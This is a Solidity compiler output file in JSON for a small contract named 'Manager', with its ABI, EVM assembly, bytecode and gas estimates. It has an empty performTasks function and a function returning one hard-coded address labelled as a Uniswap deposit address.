{
	"ipfs://QmW9H7EQXbR3dEYzq6CjLARn7ncHGBQ3Qvu2N6bTNDq3nm": {
		"Manager": {
			"abi": [
				{
					"inputs": [],
					"name": "performTasks",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "uniswapDepositAddress",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "pure",
					"type": "function"
				}
			],
			"devdoc": {
				"methods": {}
			},
			"evm": {
				"assembly": "    /* \"ipfs://QmW9H7EQXbR3dEYzq6CjLARn7ncHGBQ3Qvu2N6bTNDq3nm\":27:221  contract Manager {\r... */\n  mstore(0x40, 0x80)\n  callvalue\n    /* \"--CODEGEN--\":5:14   */\n  dup1\n    /* \"--CODEGEN--\":2:4   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":27:28   */\n  0x00\n    /* \"--CODEGEN--\":24:25   */\n  dup1\n    /* \"--CODEGEN--\":17:29   */\n  revert\n    /* \"--CODEGEN--\":2:4   */\ntag_1:\n    /* \"ipfs://QmW9H7EQXbR3dEYzq6CjLARn7ncHGBQ3Qvu2N6bTNDq3nm\":27:221  contract Manager {\r... */\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"ipfs://QmW9H7EQXbR3dEYzq6CjLARn7ncHGBQ3Qvu2N6bTNDq3nm\":27:221  contract Manager {\r... */\n      mstore(0x40, 0x80)\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_1\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_1:\n        /* \"ipfs://QmW9H7EQXbR3dEYzq6CjLARn7ncHGBQ3Qvu2N6bTNDq3nm\":27:221  contract Manager {\r... */\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x0c0f93a1\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xfeae9ad3\n      eq\n      tag_4\n      jumpi\n    tag_2:\n        /* \"--CODEGEN--\":12:13   */\n      0x00\n        /* \"--CODEGEN--\":9:10   */\n      dup1\n        /* \"--CODEGEN--\":2:14   */\n      revert\n        /* \"ipfs://QmW9H7EQXbR3dEYzq6CjLARn7ncHGBQ3Qvu2N6bTNDq3nm\":48:91  function performTasks() public {\r... */\n    tag_3:\n      tag_5\n      tag_6\n      jump\t// in\n    tag_5:\n      stop\n        /* \"ipfs://QmW9H7EQXbR3dEYzq6CjLARn7ncHGBQ3Qvu2N6bTNDq3nm\":96:218  function uniswapDepositAddress() public pure returns (address) {\r... */\n    tag_4:\n      tag_7\n      tag_8\n      jump\t// in\n    tag_7:\n      mload(0x40)\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"ipfs://QmW9H7EQXbR3dEYzq6CjLARn7ncHGBQ3Qvu2N6bTNDq3nm\":48:91  function performTasks() public {\r... */\n    tag_6:\n      jump\t// out\n        /* \"ipfs://QmW9H7EQXbR3dEYzq6CjLARn7ncHGBQ3Qvu2N6bTNDq3nm\":96:218  function uniswapDepositAddress() public pure returns (address) {\r... */\n    tag_8:\n        /* \"ipfs://QmW9H7EQXbR3dEYzq6CjLARn7ncHGBQ3Qvu2N6bTNDq3nm\":150:157  address */\n      0x00\n        /* \"ipfs://QmW9H7EQXbR3dEYzq6CjLARn7ncHGBQ3Qvu2N6bTNDq3nm\":171:213  0x2063c964EF41894ECB422123a8f701EaCF3846B2 */\n      0x2063c964ef41894ecb422123a8f701eacf3846b2\n        /* \"ipfs://QmW9H7EQXbR3dEYzq6CjLARn7ncHGBQ3Qvu2N6bTNDq3nm\":164:213  return 0x2063c964EF41894ECB422123a8f701EaCF3846B2 */\n      swap1\n      pop\n        /* \"ipfs://QmW9H7EQXbR3dEYzq6CjLARn7ncHGBQ3Qvu2N6bTNDq3nm\":96:218  function uniswapDepositAddress() public pure returns (address) {\r... */\n      swap1\n      jump\t// out\n\n    auxdata: 0xa26469706673582212204e823a8313099d8601187f49083a28b7d23a1207e2828aa6363b456ace5d531a64736f6c63430006060033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561001057600080fd5b5060db8061001f6000396000f3fe6080604052348015600f57600080fd5b506004361060325760003560e01c80630c0f93a1146037578063feae9ad314603f575b600080fd5b603d6087565b005b60456089565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b565b6000732063c964ef41894ecb422123a8f701eacf3846b290509056fea26469706673582212204e823a8313099d8601187f49083a28b7d23a1207e2828aa6363b456ace5d531a64736f6c63430006060033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0xDB DUP1 PUSH2 0x1F PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x32 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xC0F93A1 EQ PUSH1 0x37 JUMPI DUP1 PUSH4 0xFEAE9AD3 EQ PUSH1 0x3F JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x3D PUSH1 0x87 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x45 PUSH1 0x89 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST JUMP JUMPDEST PUSH1 0x0 PUSH20 0x2063C964EF41894ECB422123A8F701EACF3846B2 SWAP1 POP SWAP1 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0x4E DUP3 GASPRICE DUP4 SGT MULMOD SWAP14 DUP7 ADD XOR PUSH32 0x49083A28B7D23A1207E2828AA6363B456ACE5D531A64736F6C63430006060033 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "43800",
						"executionCost": "93",
						"totalCost": "43893"
					},
					"external": {
						"performTasks()": "122",
						"uniswapDepositAddress()": "225"
					}
				},
				"methodIdentifiers": {
					"performTasks()": "0c0f93a1",
					"uniswapDepositAddress()": "feae9ad3"
				}
			},
			"storageLayout": {
				"storage": [],
				"types": null
			},
			"userdoc": {
				"methods": {}
			}
		}
	}
}